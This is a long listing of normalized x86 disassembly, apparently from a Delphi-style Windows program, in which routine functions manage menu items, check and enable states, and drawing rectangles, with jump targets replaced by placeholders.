mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42397c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_422eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40321c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450ce8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45214f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44fdac
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_423c2c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_450ce8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45229c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_452c80
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4522cc
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_452318
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4524fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403418
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4522cc
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_452c80
mov esi eax
mov eax edi
call sub_45229c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c30
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404004
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44fdac
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404278
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452501
lea eax [ ebp - 0x24 ]
call sub_403f6c
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_450ce8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45252c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404378
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fc0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452554
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4526c4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_4526d4
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45259c
sub_45259c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450c58
push eax
call CheckMenuItem
mov eax esi
call sub_452554
sub_4525f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4526c4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450c58
push eax
call EnableMenuItem
sub_452668
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_452a28
mov edx eax
mov ecx ebx
mov eax edi
call sub_450bf8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_452554
sub_4526d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a19c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44fd00
sub_452744
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4526c4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45272c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_452a5c
mov ecx ebx
mov edx esi
mov eax edi
call sub_452850
sub_45278c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4526c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4526d4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4527e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4526c4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4526d4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4526d4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_452850
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44fd00
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_450bf8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41a218
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_452ac8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4526c4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450b28
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a19c
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a19c
mov dl [ eax + 0x3f ]
mov eax esi
call sub_452668
sub_452904
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44fd00
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4526c4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450b28
mov eax ebx
call sub_4526c4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a19c
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a08c
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_452978
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45259c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4526ac
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4526ac
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_452a40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4526c4
mov edx eax
mov ecx esi
mov eax ebx
call sub_452850
pop esi
pop ebx
retn
sub_452a5c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452a28
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_452904
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44fd00
sub_452a84
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_452ac8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_452ac8
jmp r-xdata
mov eax ebx
call sub_450b28
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4547a0
sub_452b20
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebx + 0x4c ] eax
sub_452b48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_40321c
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_452ddc
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403418
mov edx ebx
mov eax edi
call sub_41fc0c
mov eax ebx
mov si 0xffee
call sub_403418
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_452bb8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ esi + 0x4c ] eax
sub_452bec
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4526c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4526d4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_452c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_452a5c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_452a40
jmp r-xdata
mov edx ebx
mov eax esi
call sub_452a40
sub_452c90
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_452554
sub_452cbc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45252c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45259c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4525f0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fc0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45271c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_452668
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_4526f8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45270c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_452ddc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4526ac
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403418
sub_452e00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452e20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452e40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452e60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452e80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452ea0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452ec0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452ee0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452f00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452f20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a824
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44d228
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44d360
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44d3c0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44d0c0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44d480
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452f98
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fe58
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4526ac
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_452b48
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_452fec
jmp r-xdata
xor edx edx
mov eax esi
call sub_450ab0
sub_452fec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44e484
mov eax ebx
call sub_45305c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44e4c8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41fc0c
sub_453034
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_453034
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_450184
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_452ac8
mov eax ebx
pop esi
pop ebx
retn
sub_453070
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c570
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044cc
sub_4530a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404004
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_453124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_453246
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40422c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40422c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40448c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45324d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404514
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042ec
jmp r-xdata
